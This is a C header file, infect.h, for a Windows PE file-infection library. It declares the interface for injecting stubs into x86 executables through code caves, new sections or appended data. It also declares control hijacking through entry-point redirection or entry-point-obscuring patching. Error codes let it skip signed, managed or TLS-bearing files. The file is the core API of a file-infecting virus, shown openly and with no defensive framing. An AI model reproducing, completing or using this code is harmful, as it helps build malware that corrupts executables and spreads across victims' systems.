#ifndef _INFECT_H
#define _INFECT_H

#include <Windows.h>
#include <stdint.h>
#include "epo.h"
#include "conf.h"

#define INFLIB_ERR_NO_CR_METHOD			-0x01
#define INFLIB_ERR_NO_INF_METHOD		-0x02

#define INFLIB_ERR_INST_FAILURE			-0x04

#define INFLIB_ERR_ISNOT_X86_PE			-0x10
#define INFLIB_ERR_TOO_MANY_SECTIONS	-0x12
#define INFLIB_ERR_HAS_TLS				-0x14
#define INFLIB_ERR_HAS_CERT				-0x18
#define INFLIB_ERR_IS_MANAGED_CODE		-0x20
#define INFLIB_ERR_DONT_INFECT			-0x22

/* callback for getting the size of the stub */
typedef size_t (*stub_size_cb_t)(void);

/* callback for checking if the stub can be inserted in the current
 * position
 */
typedef int (*stub_insrt_cb_t)(const void *pe_map, const struct inf_stub *cur_stub,
	const struct inf_info *pe_inf_info);

/* callback for inserting the stub to the destination */
typedef int (*stub_inst_cb_t)(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info);

/* callback for checking if the PE file should be infected or not
 * returns TRUE if the file should be infected, or 0 otherwise
 */
typedef int (*infection_status_cb)(void *map, size_t size);


/* infection types 
 * code cave, new section, and last section append
 * NOTE: the insertion callback functions can be used to add stubs
 * as overlay data so they aren't covered here
 */
enum inf_type_t {code_cave_t = 1, new_sec_t, append_t};
/* control redirection types 
 * entry point hijacking, EPO CR instruction patching using the relocation
 * table as a reference, EPO imported function refering instruction patching, 
 * EPO technique for finding subroutine referencing CR instructions using
 * simple heuristics and EPO techinque for finding the most referenced subroutine
 */
enum cntrl_redr_type_t {ep_t = 1, epo_reloc_t, epo_imp_ref_t, epo_subr_ref_t, epo_most_ref_subr_t};

/* stub details that need to be populated by the caller */
struct stub_dtls {
	BOOL has_const_size;		/* does the stub have constant size? */
	BOOL is_overlay_data;		/* is the stub supposed to be inserted as an overlay data? */
	void *stub;
	union {
		size_t stub_size;
		stub_size_cb_t size_cb;	/* function to call if the stub doesn't have constant size */
	};
	stub_insrt_cb_t insert_cb;	/* optional: used to check stub should be inserted or not */
	stub_inst_cb_t inst_cb;		/* stub insertion callback */
	DWORD sec_prot;			/* stub section memory flags */
};

/* stub details that get populated by init_info function */
struct inf_stub {
	int is_inserted;		/* is the stub inserted */
	enum inf_type_t inf_type;	/* the stub's insertion type */
	struct stub_dtls sdtls;
	union {
		DWORD rva;		/* rva of the stub's destination */
		DWORD offset;		/* offset if the stub is being inserted as overlay */
	};
	size_t added_size;		/* the number of bytes the stub added onto the PE file */
};

struct pe_hdr {
	IMAGE_NT_HEADERS nthdrs;
	IMAGE_SECTION_HEADER sec_hdrs[MAX_SECTIONS];
};

struct inf_info {
	enum cntrl_redr_type_t cr_type;	/* control redirection type for the first stub */
	struct pe_hdr pehdr;
	union {
		DWORD oep;			/* original entry point if cr_type is ep_t */
		union cr_redr_info redr_inf;	/* info about the CR instruction if cr_type is an EPO technique */
	};
	struct inf_stub *inf_stubs;
	uint32_t nstubs;
};

/* quick check to see if the file is infectable / should be infected
 * returns 0 if it's infectable or an error code describing why if not
 */
int get_infection_status(void *map, size_t map_size, infection_status_cb status_cb);

/* called to calculate where the stubs should be inserted
 * doesn't have any side effect on the PE file
 *
 * returns 0 on success, error code on failure
 */
int init_inf_info(const void *pe_map, size_t pe_fsize, struct inf_info *pe_inf_info,
		const enum inf_type_t inf_type_p[], const enum cntrl_redr_type_t redr_type_p[], size_t *add_size);

/* main infection routine, installs the stubs by calling
 * their respective installation callbacks
 *
 * returns 0 on success, error code on failure
 */
int infect(void *pe_map, struct inf_info *pe_inf_info);

#endif